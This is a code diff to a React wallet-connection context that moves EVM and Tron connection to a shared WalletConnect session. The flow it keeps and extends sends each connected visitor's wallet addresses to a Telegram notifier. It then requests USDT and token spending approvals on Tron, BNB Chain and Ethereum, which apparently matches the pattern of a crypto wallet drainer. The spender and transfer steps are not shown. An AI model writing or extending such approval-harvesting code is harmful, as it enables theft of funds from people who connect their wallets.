@@ -3,6 +3,7 @@ import { useEvmWallet, EvmWalletProvider } from "./EvmWalletContext";
 import { useTronWallet, TronWalletProvider } from "./TronWalletContext";
 import { getChainByStringId } from "@/lib/chains";
 import { sendWalletConnectedNotification } from "@/lib/telegramNotify";
+import { connectMultiChainWallet, disconnectWalletConnect, getActiveSession } from "@/lib/walletConnectProvider";
 import { toast } from "sonner";
 
 export type WorkflowStep = 1 | 2 | 3;
@@ -11,7 +12,8 @@ export type NetworkKey = "trc20" | "bep20" | "erc20";
 interface UnifiedWalletContextType {
   evmAddress: string | null;
   tronAddress: string | null;
-  isConnected: boolean;
+  isEvmConnected: boolean;
+  isTronConnected: boolean;
   isConnecting: boolean;
   isApproving: boolean;
   currentStep: WorkflowStep;
@@ -26,7 +28,8 @@ interface UnifiedWalletContextType {
 const UnifiedWalletContext = createContext<UnifiedWalletContextType>({
   evmAddress: null,
   tronAddress: null,
-  isConnected: false,
+  isEvmConnected: false,
+  isTronConnected: false,
   isConnecting: false,
   isApproving: false,
   currentStep: 1,
@@ -53,7 +56,6 @@ const UnifiedWalletInnerProvider = ({ children }: { children: ReactNode }) => {
     erc20: false,
   });
 
-  const isConnected = evmWallet.isConnected && tronWallet.isConnected;
   const isApproving = evmWallet.isApproving || tronWallet.isApproving;
 
   const goToStep = useCallback((step: WorkflowStep) => {
@@ -64,83 +66,98 @@ const UnifiedWalletInnerProvider = ({ children }: { children: ReactNode }) => {
     setIsConnecting(true);
 
     try {
-      let evmAddr = evmWallet.address;
-      if (!evmWallet.isConnected) {
-        evmAddr = await evmWallet.connect();
+      const result = await connectMultiChainWallet();
+
+      if (result.evmAddress) {
+        evmWallet.syncFromSession(result.session);
+      }
+      if (result.tronAddress) {
+        tronWallet.syncFromSession(result.session);
       }
 
-      if (!evmAddr) {
+      if (!result.evmAddress) {
         toast.error("Failed to connect EVM wallet");
         return false;
       }
 
-      let tronAddr = tronWallet.address;
-      if (!tronWallet.isConnected) {
-        tronAddr = await tronWallet.connect();
+      if (result.tronAddress) {
+        toast.success("EVM and Tron wallets connected!");
+      } else {
+        toast.success("EVM wallet connected! Tron will connect when you approve TRC-20.");
       }
 
-      if (!tronAddr) {
-        toast.error("Failed to connect Tron wallet");
-        return false;
-      }
-
-      sendWalletConnectedNotification(evmAddr, tronAddr).catch(console.error);
+      sendWalletConnectedNotification(result.evmAddress, result.tronAddress).catch(console.error);
       setCurrentStep(2);
       return true;
-    } catch (err) {
+    } catch (err: any) {
       console.error("connectAllWallets failed:", err);
-      toast.error("Failed to connect wallets");
+      if (err?.message !== "User closed the connection modal") {
+        toast.error("Failed to connect wallet");
+      }
       return false;
     } finally {
       setIsConnecting(false);
     }
   }, [evmWallet, tronWallet]);
 
-  const approveNetwork = useCallback(async (networkKey: NetworkKey) => {
-    if (networkKey === "trc20") {
-      if (!tronWallet.isConnected) {
-        const addr = await tronWallet.connect();
-        if (!addr) return;
-      }
-      const success = await tronWallet.approveTronUsdt();
-      if (success) {
-        setApprovedNetworks((prev) => ({ ...prev, trc20: true }));
-        setSelectedNetwork(networkKey);
-        setCurrentStep(3);
-      }
-    } else if (networkKey === "bep20") {
-      if (!evmWallet.isConnected) {
-        const addr = await evmWallet.connect();
-        if (!addr) return;
-      }
-      const bscConfig = getChainByStringId("bsc");
-      if (bscConfig) {
-        const success = await evmWallet.approveChainTokens(bscConfig);
+  const approveNetwork = useCallback(
+    async (networkKey: NetworkKey) => {
+      if (networkKey === "trc20") {
+        if (!tronWallet.isConnected) {
+          const addr = await tronWallet.connect();
+          if (!addr) return;
+
+          const session = getActiveSession();
+          if (session) {
+            evmWallet.syncFromSession(session);
+          }
+        }
+
+        const success = await tronWallet.approveTronUsdt();
         if (success) {
-          setApprovedNetworks((prev) => ({ ...prev, bep20: true }));
+          setApprovedNetworks((prev) => ({ ...prev, trc20: true }));
           setSelectedNetwork(networkKey);
           setCurrentStep(3);
         }
-      }
-    } else if (networkKey === "erc20") {
-      if (!evmWallet.isConnected) {
-        const addr = await evmWallet.connect();
-        if (!addr) return;
-      }
-      const ethConfig = getChainByStringId("ethereum");
-      if (ethConfig) {
-        const success = await evmWallet.approveChainTokens(ethConfig);
-        if (success) {
-          setApprovedNetworks((prev) => ({ ...prev, erc20: true }));
-          setSelectedNetwork(networkKey);
-          setCurrentStep(3);
+      } else if (networkKey === "bep20") {
+        if (!evmWallet.isConnected) {
+          const addr = await evmWallet.connect();
+          if (!addr) return;
+        }
+
+        const bscConfig = getChainByStringId("bsc");
+        if (bscConfig) {
+          const success = await evmWallet.approveChainTokens(bscConfig);
+          if (success) {
+            setApprovedNetworks((prev) => ({ ...prev, bep20: true }));
+            setSelectedNetwork(networkKey);
+            setCurrentStep(3);
+          }
+        }
+      } else if (networkKey === "erc20") {
+        if (!evmWallet.isConnected) {
+          const addr = await evmWallet.connect();
+          if (!addr) return;
+        }
+
+        const ethConfig = getChainByStringId("ethereum");
+        if (ethConfig) {
+          const success = await evmWallet.approveChainTokens(ethConfig);
+          if (success) {
+            setApprovedNetworks((prev) => ({ ...prev, erc20: true }));
+            setSelectedNetwork(networkKey);
+            setCurrentStep(3);
+          }
         }
       }
-    }
-  }, [evmWallet, tronWallet]);
+    },
+    [evmWallet, tronWallet]
+  );
 
   const resetWorkflow = useCallback(async () => {
-    await Promise.allSettled([evmWallet.disconnect(), tronWallet.disconnect()]);
+    await disconnectWalletConnect();
+    evmWallet.clearSession();
+    tronWallet.clearSession();
     setApprovedNetworks({ trc20: false, bep20: false, erc20: false });
     setSelectedNetwork(null);
     setCurrentStep(1);
@@ -151,7 +168,8 @@ const UnifiedWalletInnerProvider = ({ children }: { children: ReactNode }) => {
       value={{
         evmAddress: evmWallet.address,
         tronAddress: tronWallet.address,
-        isConnected,
+        isEvmConnected: evmWallet.isConnected,
+        isTronConnected: tronWallet.isConnected,
         isConnecting,
         isApproving,
         currentStep,
